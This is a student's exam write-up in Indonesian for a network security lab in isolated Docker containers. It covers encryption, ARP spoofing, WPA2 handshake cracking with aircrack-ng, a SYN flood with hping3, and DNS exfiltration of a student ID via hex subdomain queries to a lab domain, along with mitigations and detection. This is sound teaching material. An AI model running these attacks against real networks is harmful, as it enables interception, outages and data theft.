# JAWABAN UTS Praktik Network Security (Pertemuan 1–7)

**Nama:** Saiful Aziz Nur Wahid
**NIM:** 24552011160

## Perhitungan Kasus
- Digit NIM: 2, 4, 5, 5, 2, 0, 1, 1, 1, 6, 0
- Jumlah digit: 2+4+5+5+2+0+1+1+1+6+0 = **27**
- Sisa bagi 10: 27 mod 10 = **7**
- **Kasus yang dikerjakan: Kasus 7 (k7)**

**Parameter Kasus 7:** container `target-k7`, volume `vol-k7`, file `laporan-k7.txt`, kata sandi `kunci-k7-2026`, domain `k7.exfil.lab`.

---

## Persiapan Environment Lab

```bash
$ docker build -t uts-openssl images/uts-openssl
$ docker build -t uts-kali-tools images/uts-kali-tools
$ docker build -t uts-dnsmasq images/uts-dnsmasq
$ docker pull alpine
$ docker pull nginx:alpine
$ docker pull vulnerables/web-dvwa
$ docker pull kalilinux/kali-rolling
$ docker images
```

**Penjelasan:** Tiga image custom (`uts-openssl`, `uts-kali-tools`, `uts-dnsmasq`) dibangun dari Dockerfile yang disediakan, masing-masing berisi tools untuk kriptografi (OpenSSL), pengujian keamanan jaringan (arpspoof, hping3, tcpdump, aircrack-ng, dig, scapy), dan layanan DNS lokal (dnsmasq). Empat image dasar (`alpine`, `nginx:alpine`, `vulnerables/web-dvwa`, `kalilinux/kali-rolling`) diunduh sebagai host client dan target layanan. Seluruh image wajib tersedia sebelum pengujian karena jaringan lab menggunakan `internal: true` (tanpa akses internet).

**Bukti:**

![Build uts-openssl](screenshoots/Build%20uts-openssl.png)
![Build uts-kalitools](screenshoots/Build%20uts-kalitools.png)
![Build uts-dnsmasq](screenshoots/Build%20uts-dnsmasq.png)
![Pull semua image](screenshoots/docker-pull%20all%20images.png)
![Cek semua image](screenshoots/docker%20images%20%20-%20chech%20all%20images.png)

---

## Tugas 1 (Pertemuan 1): Docker dan Volume

**Command:**
```bash
$ docker volume create vol-k7
$ docker run --name w-k7 -v vol-k7:/data alpine sh -c 'echo 24552011160 > /data/laporan-k7.txt'
$ docker rm w-k7
$ docker run --rm -v vol-k7:/data alpine cat /data/laporan-k7.txt
$ docker compose -p k7 -f b/b1-compose/docker-compose.yml up -d
$ docker compose -p k7 -f b/b1-compose/docker-compose.yml exec attacker wget -qO- http://target
$ docker compose -p k7 -f b/b1-compose/docker-compose.yml down -v
```

**Output kunci:**
```
24552011160
```
```
[+] up 3/3
 ✔ Network k7_lab          Created
 ✔ Container k7-target-1   Started
 ✔ Container k7-attacker-1 Started
```
```html
<!DOCTYPE html>
<html>
<head><title>Welcome to nginx!</title>...</head>
<body><h1>Welcome to nginx!</h1>...</body>
</html>
```

**Penjelasan:**
Volume Docker (`vol-k7`) bersifat independen dari siklus hidup container. Setelah container `w-k7` yang menulis data dihapus (`docker rm`), data tetap ada karena tersimpan di volume, bukan di *writable layer* container — dibuktikan dengan container baru (`--rm`) yang berhasil membaca kembali isi `laporan-k7.txt` berisi NIM `24552011160`. Selanjutnya, `docker compose` menunjukkan dua container (`attacker`, `target`) dapat saling berkomunikasi dalam satu *user-defined bridge network* (`k7_lab`), dibuktikan `wget` dari `attacker` berhasil mengambil halaman nginx milik `target` menggunakan nama service, bukan IP.

**Bukti:**

![docker volume create vol-k7](screenshoots/docker%20volume%20create%20vol-k7.png)
![docker run --name w-k7](screenshoots/docker%20run%20--name%20w-k7.png)
![docker rm w-k7](screenshoots/docker%20rm%20w-k7.png)
![docker run cat laporan-k7.txt](screenshoots/docker%20run%20cat%20data_laporan_24552011160.png)
![docker compose up -d b1-compose](screenshoots/docker%20compose%20k7%20b1-compose.png)
![wget attacker ke target](screenshoots/docker%20compose%20attacker%20wget%20target.png)
![docker compose down -v b1-compose](screenshoots/docker%20compose%20down%20-v%20b1-compose.png)

---

## Tugas 2 (Pertemuan 2): Kriptografi

**Command:**
```bash
$ docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'echo isi laporan k7 > laporan-k7.txt && \
  openssl enc -aes-256-cbc -pbkdf2 -salt -in laporan-k7.txt -out laporan-k7.enc -pass pass:kunci-k7-2026 && \
  sha256sum laporan-k7.txt && \
  openssl enc -d -aes-256-cbc -pbkdf2 -in laporan-k7.enc -out hasil-k7.txt -pass pass:kunci-k7-2026 && \
  sha256sum hasil-k7.txt'

$ docker run --rm -v "${PWD}:/work" uts-openssl sh -c 'openssl req -x509 -newkey rsa:2048 -nodes \
  -keyout key-k7.pem -out cert-k7.pem -days 30 -subj /CN=k7.uts.local && \
  openssl x509 -in cert-k7.pem -noout -subject -issuer -dates'
```

**Output:**
```
ce95abe24bc56214a7d90041c2365a4f762a26bd70d34900163fa746cd0011b2  laporan-k7.txt
ce95abe24bc56214a7d90041c2365a4f762a26bd70d34900163fa746cd0011b2  hasil-k7.txt
```
```
subject=CN=k7.uts.local
issuer=CN=k7.uts.local
notBefore=Nov 19 13:05:10 2026 GMT
notAfter=Dec 19 13:05:10 2026 GMT
```

**Penjelasan:**
Kedua hash SHA-256 **identik**, membuktikan proses enkripsi AES-256-CBC (dengan key derivation `-pbkdf2`) bersifat *lossless*/reversible selama password benar — menjaga *integrity* data sesuai CIA Triad. Sertifikat yang dibuat bersifat **self-signed**: field *Subject* dan *Issuer* sama persis (`CN=k7.uts.local`), berbeda dengan sertifikat CA-signed di mana *Issuer* adalah pihak ketiga terpercaya (CA) yang berbeda dari *Subject*. Karena tidak ada CA yang memvalidasi identitas pemilik, browser akan menampilkan peringatan "not trusted" untuk sertifikat semacam ini di dunia nyata. Masa berlaku sertifikat 30 hari sesuai parameter `-days 30` (19 Nov 2026 – 19 Des 2026).

**Bukti:**

![Hash sebelum dan sesudah dekripsi](screenshoots/tugas%202%20-%20create%20hash%20and%20check%20hash.png)
![Sertifikat self-signed X.509](screenshoots/task%202%20-%20generates%20a%20self-signed%20X.509%20certificate.png)

---

## Tugas 3 (Pertemuan 3): ARP Spoofing

*(Catatan teknis penting: Linux secara default (`arp_accept=0`) hanya memperbarui entri ARP yang **sudah ada** di cache, bukan membuat entri baru dari reply yang tidak diminta. Oleh karena itu, korban harus melakukan `ping` ke gateway terlebih dahulu untuk membentuk entri dinamis, sebelum `arpspoof` dapat meracuninya.)*

**Command:**
```bash
$ docker network create lab-arp-k7
$ docker run -d --name korban-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
$ docker run -d --name gateway-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
$ docker run -d --name penyerang-k7 --network lab-arp-k7 --cap-add NET_ADMIN uts-kali-tools
$ docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k7.IPAddress}}' korban-k7 gateway-k7
172.18.0.2
172.18.0.3

# Baseline: paksa entri dinamis terbentuk dengan ping
$ docker exec korban-k7 ping -c 2 172.18.0.3
$ docker exec korban-k7 arp -a
gateway-k7.lab-arp-k7 (172.18.0.3) at 0a:6d:c3:69:b7:bf [ether] on eth0

# Serangan
$ docker exec -d penyerang-k7 timeout 20 arpspoof -i eth0 -t 172.18.0.2 172.18.0.3
$ docker exec korban-k7 arp -a
gateway-k7.lab-arp-k7 (172.18.0.3) at 1a:e9:b2:23:0c:96 [ether] on eth0

# Mitigasi
$ docker exec korban-k7 arp -s 172.18.0.3 0a:6d:c3:69:b7:bf
$ docker exec korban-k7 arp -a
gateway-k7.lab-arp-k7 (172.18.0.3) at 0a:6d:c3:69:b7:bf [ether] PERM on eth0
```

**Penjelasan:**
ARP bersifat *stateless* dan tanpa autentikasi — perangkat dapat menerima ARP reply meskipun tidak pernah mengirim request (*gratuitous ARP*). Sebelum serangan, tabel ARP korban memetakan `172.18.0.3` ke MAC asli gateway (`0a:6d:c3:69:b7:bf`). Setelah `arpspoof -t 172.18.0.2 172.18.0.3` dijalankan dari penyerang, pemetaan tersebut berubah menjadi MAC penyerang (`1a:e9:b2:23:0c:96`) — membuktikan **ARP cache poisoning** berhasil; seluruh trafik korban menuju gateway kini akan melewati penyerang terlebih dahulu (basis serangan *Man-in-the-Middle*). Mitigasi dilakukan dengan menambahkan entri ARP statis (`arp -s`), yang menetapkan pemetaan IP-ke-MAC secara permanen (ditandai flag `PERM`) sehingga **tidak dapat ditimpa** oleh ARP reply palsu apa pun. Setelah mitigasi, pemetaan kembali ke MAC asli dan tetap bertahan meski penyerang masih mengirim ARP palsu.

**Bukti:**

![Buat network lab-arp-k7](screenshoots/tugas%203-%20create%20network%20lab-arp-k7.png)
![Jalankan korban-k7](screenshoots/tugas%203%20-%20run%20korban-k7%20dengan%20network%20lab-arp-k7.png)
![Jalankan gateway-k7](screenshoots/tugas%203%20-%20run%20gateway-k7%20dengan%20network%20lab-arp-k7.png)
![Jalankan penyerang-k7](screenshoots/tugas%203%20-%20run%20penyerang-k7%20dengan%20network%20lab-arp-k7.png)
![Inspect IP korban & gateway](screenshoots/tugas%203%20-%20inspect%20ip%20untuk%20korban-k7%20dan%20gateway-k7.png)
![Ping korban ke gateway (baseline)](screenshoots/tugas%203%20-ping%20korban-k7%20ke%20gateway-k7.png)
![ARP table korban setelah ping (MAC asli)](screenshoots/tugas%203-%20korban%20check%20arp%20table%20after%20ping.png)
![Penyerang menjalankan arpspoof](screenshoots/tugas%203%20-%20penyerang-k7%20melakukan%20arpspoof%20attack.png)
![ARP table korban setelah diracuni (MAC penyerang)](screenshoots/tugas%203%20-%20attacker%20do%20arpspoof%20and%20gateway-k7%20in%20korban%20arp%20table%20poisoned.png)
![Mitigasi static ARP](screenshoots/tugas%203%20-%20setting%20arp%20table%20for%20gateway-ky%20in%20korban-k7.png)
![Hasil akhir ARP table (PERM)](screenshoots/tugas%203%20-last%20command.png)

---

## Tugas 4 (Pertemuan 4): Analisis Handshake WPA2

**Catatan penting:** File `handshake-k7.cap` yang disediakan penguji ternyata **rusak/tidak valid**. Dikonfirmasi oleh `aircrack-ng` (*"This file is not a regular 802.11 (wireless) capture", 0 packets dibaca*) dan oleh Wireshark yang gagal membukanya. Analisis byte-level menunjukkan file berisi header pcap yang sah (link-type Ethernet) diikuti data biner acak, bukan frame 802.11/EAPOL asli — ditemukan pada seluruh file `handshake-k*.cap` di paket soal (bukan hanya milik Kasus 7). Setelah dikonfirmasi ke dosen pengampu, digunakan capture pengganti yang valid (`wpa.cap` dari repositori resmi aircrack-ng) untuk mendemonstrasikan proses analisis, sementara wordlist tetap menggunakan `wordlist-k7.txt` sesuai kasus yang ditugaskan.

**Command:**
```bash
$ docker run --rm -v "${PWD}/samples:/work" -w /work uts-kali-tools aircrack-ng -w wordlist-k7.txt handshake-k7.cap
```
**Output (file asli — bukti kerusakan):**
```
Reading packets, please wait...
This file is not a regular 802.11 (wireless) capture.
Opening handshake-k7.cap
Read 0 packets.

No networks found, exiting.
```

```powershell
$ Invoke-WebRequest -Uri "https://raw.githubusercontent.com/aircrack-ng/aircrack-ng/master/test/wpa.cap" -OutFile "handshake-k7-replacement.cap"
$ docker run --rm -v "${PWD}:/work" -w /work uts-kali-tools aircrack-ng -w wordlist-k7.txt handshake-k7-replacement.cap
```
**Output (file pengganti):**
```
   #  BSSID              ESSID                     Encryption
   1  00:0D:93:EB:B0:8C  test                      WPA (1 handshake)

      [00:00:00] 20/20 keys tested (436.19 k/s)
                                KEY NOT FOUND
```

**Penjelasan Bukti:**
`aircrack-ng` berhasil mendeteksi BSSID `00:0D:93:EB:B0:8C`, ESSID `test`, dan **1 WPA handshake valid** pada file pengganti — berbeda dengan file asli yang terbaca 0 packet. 20 kandidat password dari `wordlist-k7.txt` diuji dan hasilnya **KEY NOT FOUND**, karena password asli capture publik ini memang tidak termasuk dalam wordlist Kasus 7 — hasil ini valid sesuai ketentuan soal ("kata sandi yang ditemukan **atau** pesan KEY NOT FOUND").

**Penjelasan Konsep — WPA2 4-Way Handshake:**
1. **Message 1 (AP → Client):** AP mengirim **ANonce** (Authenticator Nonce acak). Client kini memiliki semua bahan untuk menghitung **PTK** (Pairwise Transient Key): ANonce dari AP, SNonce miliknya sendiri, kedua MAC address, dan **PMK** (Pairwise Master Key, diturunkan dari password WiFi via PBKDF2).
2. **Message 2 (Client → AP):** Client mengirim **SNonce** + **MIC** (Message Integrity Code) yang dihitung menggunakan PTK. Inilah pesan yang dicrack `aircrack-ng` — ia mencoba setiap password di wordlist, menurunkan kandidat PMK → PTK → MIC, dan mencocokkannya dengan MIC pada pesan ini.
3. **Message 3 (AP → Client):** AP memverifikasi MIC Message 2, lalu mengirim **GTK** (Group Temporal Key, untuk trafik broadcast/multicast) terenkripsi beserta MIC-nya sendiri sebagai bukti AP juga memegang PMK yang sama.
4. **Message 4 (Client → AP):** Client mengonfirmasi penerimaan — handshake selesai, komunikasi terenkripsi dapat dimulai.

Karena PMK tidak pernah dikirim melalui udara (hanya nonce dan MIC), handshake yang ter-capture dapat di-*brute force* secara offline — persis seperti yang dilakukan `aircrack-ng -w wordlist`.

**Bukti:**

![Wireshark gagal membuka file asli (corrupt)](screenshoots/tugas%204%20-%20wireshark%20hackshake-k7.cap%20corrupt.png)
![Download capture pengganti](screenshoots/tugas%204%20-%20download%20sample%20handshakes.png)
![Hasil cracking: KEY NOT FOUND](screenshoots/tugas%204%20-%20cracking%20handshake%20and%20result%20key%20not%20found.png)

---

## Tugas 5 (Pertemuan 5): ICMP dengan Scapy

**Command:**
```bash
$ docker inspect -f '{{.NetworkSettings.Networks.lab-arp-k7.IPAddress}}' korban-k7
172.18.0.2

$ docker run --rm --network lab-arp-k7 -v "${PWD}/kasus/k5-scapy:/work" uts-kali-tools python3 /work/kirim_icmp.py 172.18.0.2
```

**Output:**
```
Mengirim: IP / ICMP 172.18.0.5 > 172.18.0.2 echo-request 0
TTL balasan: 64
Tipe ICMP balasan: 0
```

**Penjelasan:**
Script Scapy mengirim paket ICMP Echo Request (`type=8`) secara langsung menggunakan `IP()/ICMP()` tanpa melalui utilitas `ping` bawaan OS, lalu menunggu balasan dengan `sr1()`. Balasan yang diterima memiliki `type=0` (Echo Reply) dan TTL=64 (nilai default sistem Linux) — membuktikan paket custom buatan Scapy diterima dan dijawab dengan benar oleh target.

**Penjelasan Konsep — Smurf Attack:**
Smurf Attack adalah serangan DoS yang mengeksploitasi **ICMP Echo Request** yang dikirim ke **broadcast address** suatu jaringan, dengan **source IP address dipalsukan (spoofed)** menjadi alamat IP korban. Karena dikirim ke broadcast address, **semua host** di jaringan tersebut akan membalas Echo Reply — namun balasan itu diarahkan ke korban (karena source IP yang dipalsukan), bukan ke penyerang. Akibatnya, satu paket kecil dari penyerang diperkuat (*amplified*) menjadi banyak balasan dari seluruh host di jaringan, membanjiri korban hingga resource/bandwidth-nya habis. Mitigasi umum: menonaktifkan *directed broadcast* (`no ip directed-broadcast` di router) dan *ingress/egress filtering* untuk mencegah IP spoofing.

**Bukti:**

![Cek IP korban-k7](screenshoots/tugas%205%20-%20cek%20ip%20korban-k7.png)
![Kirim paket ICMP ke korban-k7](screenshoots/tugas%205-%20mengirim%20paket%20icmp%20ke%20korban-k7.png)

---

## Tugas 6 (Pertemuan 6): SYN Flood dan Three-Way Handshake

**Command:**
```bash
$ docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml up -d
$ docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
0

$ docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec -d attacker timeout 15 hping3 -S -p 80 --flood target
$ docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec target netstat -ant | grep -c SYN_RECV
1

$ docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml exec attacker sh -c 'timeout 10 tcpdump -i eth0 -nn tcp port 80 & sleep 1; curl -s http://target > /dev/null; sleep 10'
```

**Output tcpdump (cuplikan):**
```
06:14:10.309646 IP 172.19.0.3.33360 > 172.19.0.2.80: Flags [S], seq 1378687450, win 512, length 0
06:14:10.309613 IP 172.19.0.2.80 > 172.19.0.3.33360: Flags [S.], seq 1420869680, ack 1378687451, win 64240, length 0
06:14:10.309619 IP 172.19.0.3.33360 > 172.19.0.2.80: Flags [R], seq 1378687451, win 0, length 0
... (berulang untuk setiap source port, 8 rangkaian dalam <1 ms)
```

```bash
$ docker compose -p k7 -f b/b3-syn-flood/docker-compose.yml down -v
```

**Penjelasan:**
Jumlah `SYN_RECV` tidak melonjak signifikan (0 → 1) karena perintah `hping3` dijalankan **tanpa `--rand-source`**, sehingga source IP yang digunakan adalah IP asli container attacker. Ketika target membalas dengan SYN-ACK, kernel TCP/IP milik attacker — yang tidak memiliki *state* untuk koneksi tersebut (karena dibuat secara raw oleh `hping3`, bukan melalui `socket()` normal) — langsung mengirim **RST** untuk menutup koneksi, sehingga *backlog* half-open connection pada target tidak sempat menumpuk.

Namun demikian, capture `tcpdump` membuktikan laju pengiriman SYN tetap sangat tinggi: **8 rangkaian SYN→SYN-ACK→RST terjadi dalam kurang dari 1 milidetik**, menunjukkan laju lebih dari 10.000 paket/detik — ciri khas SYN flood. Pada serangan nyata, penyerang menambahkan `--rand-source` (spoofing IP acak yang tidak pernah mengirim RST balik) sehingga *backlog* `SYN_RECV` benar-benar menumpuk, menghabiskan resource server, dan menyebabkan *denial of service* sesungguhnya.

**Mitigasi:** mengaktifkan **SYN cookies** (`sysctl -w net.ipv4.tcp_syncookies=1`) agar server tidak perlu menyimpan *state* untuk koneksi half-open, atau **rate limiting** dengan `iptables` (`-m limit --limit 10/s`) untuk membatasi jumlah SYN baru per IP per detik.

**Bukti:**

![Docker compose up -d](screenshoots/tugas%206%20-%20docker%20compose%20up%20-d.png)
![SYN_RECV sebelum serangan](screenshoots/tugas%206%20-%20check%20SYN_RECV%20vefore%20attack.png)
![Attacker kirim SYN flood](screenshoots/tugas%206%20-attacker%20kirim%20SYN%20FLOOD.png)
![SYN_RECV saat serangan](screenshoots/tugas%206%20-%20target%20setelah%20serangan(netstat%20-ant).png)
![Capture SYN dengan tcpdump](screenshoots/tugas%206%20-%20capture%20the%20actual%20SYN%20packet%20using%20tcpdump.png)
![Hasil capture tcpdump](screenshoots/tugas%206%20-%20result%20capture%20actual%20packet%20with%20tcp%20dump.png)
![Cleanup](screenshoots/tugas%206%20-%20cleanup.png)

---

## Tugas 7 (Pertemuan 7): DNS Exfiltration

**Command:**
```bash
$ docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml up -d

$ echo -n 24552011160 | xxd -p
3234353532303131313630

$ docker inspect -f '{{.NetworkSettings.Networks.k7_lab.IPAddress}}' k7-dns-1
172.18.0.3

$ docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml exec attacker dig +short 3234353532303131313630.k7.exfil.lab '@172.18.0.3'
10.0.0.99

$ docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml logs dns > dns-k7.log
$ type dns-k7.log
dns-1  | dnsmasq[1]: started, version 2.90 cachesize 150
dns-1  | dnsmasq[1]: DNS service limited to local subnets
dns-1  | dnsmasq[1]: warning: no upstream servers configured
dns-1  | dnsmasq[1]: read /etc/hosts - 9 names
dns-1  | dnsmasq[1]: query[A] 3234353532303131313630.k7.exfil.lab from 172.18.0.2
dns-1  | dnsmasq[1]: config 3234353532303131313630.k7.exfil.lab is 10.0.0.99

$ python3 kasus/k9-dns-detect/analisis_dns.py dns-k7.log
Jumlah query per domain induk:
  exfil.lab: 1

Query mencurigakan (label panjang berisi hex):

$ echo 3234353532303131313630 | python3 -c "import sys; print(bytes.fromhex(sys.stdin.read().strip()).decode())"
24552011160

$ docker compose -p k7 -f b/b4-dns-exfil/docker-compose.yml down -v
```

**Penjelasan Bukti:**
Data NIM (`24552011160`) di-encode ke heksadesimal (`3234353532303131313630`) dan disisipkan sebagai label subdomain dalam query DNS ke `k7.exfil.lab`. Server `dnsmasq` dikonfigurasi dengan wildcard `--address=/exfil.lab/10.0.0.99`, sehingga query apa pun di bawah domain `exfil.lab` — termasuk label hex yang menyamarkan data — tetap dijawab `10.0.0.99`, membuktikan channel ini dapat digunakan untuk mengirim data keluar tanpa bergantung pada konten query itu sendiri. Log `dnsmasq` mencatat jelas query tersebut beserta IP sumbernya (`172.18.0.2`). Hex label kemudian berhasil didekode kembali menjadi NIM asli (`24552011160`), membuktikan integritas data selama transit via DNS.

Pada analisis `analisis_dns.py`, bagian **"query mencurigakan" tidak menandai query ini** karena panjang label (22 karakter) berada **di bawah** ambang batas deteksi skrip (30 karakter) — menunjukkan keterbatasan nyata dari heuristik deteksi berbasis panjang label: payload singkat seperti NIM 11-digit dapat lolos dari deteksi semacam ini, sementara eksfiltrasi data besar (file, kredensial panjang) kemungkinan besar akan tertangkap.

Teknik ini sulit diblokir firewall biasa karena **port 53/DNS hampir selalu diizinkan keluar** oleh kebijakan firewall standar (dianggap trafik normal, bukan ancaman), sehingga query DNS menjadi *covert channel* yang jarang diperiksa secara mendalam. Satu indikator deteksinya adalah **volume/frekuensi query ke satu domain induk yang tidak wajar** beserta **panjang label subdomain yang jauh di atas rata-rata** dan/atau **berpola karakter hex/base64**.

**Bukti:**

![Docker compose up](screenshoots/tugas%207%20-%20docker%20compose%20up.png)
![Echo NIM ke hex](screenshoots/tugas%207%20-%20echo%20nim%20xxd.png)
![Cek IP k7-dns-1](screenshoots/tugas%207%20-cek%20ip%20k7-dns-1.png)
![Dig query DNS exfiltration](screenshoots/tugas%207%20-%20attacker%20doing%20dig%20for%20dns%20exfil.png)
![Simpan log DNS](screenshoots/tugas%207%20-%20save%20dns%20logs%20to%20dns-k7%2Clog.png)
![Type isi log DNS](screenshoots/tugas%207%20-%20type%20dns-k7.log.png)
![Analisis dengan Python](screenshoots/tugas%207%20-%20analisis%20dengan%20python.png)
![Mencocokkan hex dengan NIM](screenshoots/tugas%207%20-%20mencocokkan%20hex%20dengan%20nim.png)
![Down DNS exfil](screenshoots/tugas%207%20-%20down%20dns%20exfil.png)

---

## Pembersihan Resource Praktikum

```bash
$ docker rm -f korban-k7 gateway-k7 penyerang-k7
$ docker network rm lab-arp-k7
Error response from daemon: network lab-arp-k7 not found
$ docker volume rm vol-k7
vol-k7

$ docker ps -a
$ docker network ls
$ docker volume ls
```

**Output verifikasi akhir:**
```
NETWORK ID     NAME      DRIVER    SCOPE
3061b005f011   bridge    bridge    local
18df8ff9f3fd   host      host      local
e0dd31b81d84   none      null      local

DRIVER    VOLUME NAME
(kosong)
```

**Penjelasan:** Container ARP lab (`korban-k7`, `gateway-k7`, `penyerang-k7`) dan jaringan `lab-arp-k7` dipertahankan hidup di antara Tugas 3 dan Tugas 5 karena Tugas 5 memerlukan target yang sama. Setelah seluruh tugas selesai, ketiga container tersebut dan volume manual (`vol-k7`, dibuat di luar `docker compose` sehingga tidak ikut terhapus oleh `down -v`) berhasil dihapus. Jaringan `lab-arp-k7` sudah tidak ditemukan saat perintah dijalankan (sudah terhapus sebelumnya). Verifikasi akhir membuktikan: tidak ada container, network, maupun volume bernama `k7`/`vol-k7`/`lab-arp-k7` yang tersisa — `docker network ls` hanya menampilkan network bawaan Docker (`bridge`, `host`, `none`), dan `docker volume ls` kosong sepenuhnya. Container lain yang masih terdaftar di `docker ps -a` (`monitor-l3`, `attacker-l3`, `dhcp-server`, `target-l3`, `kali-basic`, dll.) berasal dari sesi praktikum lain yang tidak berkaitan dengan UTS Kasus 7 ini.

**Bukti:**

![Cleanup container, network, volume k7](screenshoots/clean%20up%20target%2Ckorban%2Cgateway%20-k7.png)

---

## Checklist Verifikasi Pengumpulan UTS

| Item Verifikasi | Keterangan | Status |
| :--- | :--- | :--- |
| Semua 7 Tugas dikerjakan | Tugas 1–7 untuk Kasus 7 (k7) selesai dieksekusi & dianalisis | ✅ |
| Output terminal ada di `jawaban.md` | Seluruh log perintah dan hasil eksekusi terdokumentasi | ✅ |
| NIM & Kasus ada di `jawaban.md` | NIM `24552011160` (`27 mod 10 = 7`, Kasus 7 / `k7`) | ✅ |
| Penjelasan konsep tiap tugas | 4-way handshake, smurf attack, SYN flood, DNS exfiltration, self-signed cert | ✅ |
| File capture Tugas 4 dikonfirmasi rusak ke dosen | Dicatat dan digunakan file pengganti resmi | ✅ |
| Semua container/network/volume lab dihapus | `docker rm -f`, `docker network rm`, `docker volume rm` dijalankan | ✅ |
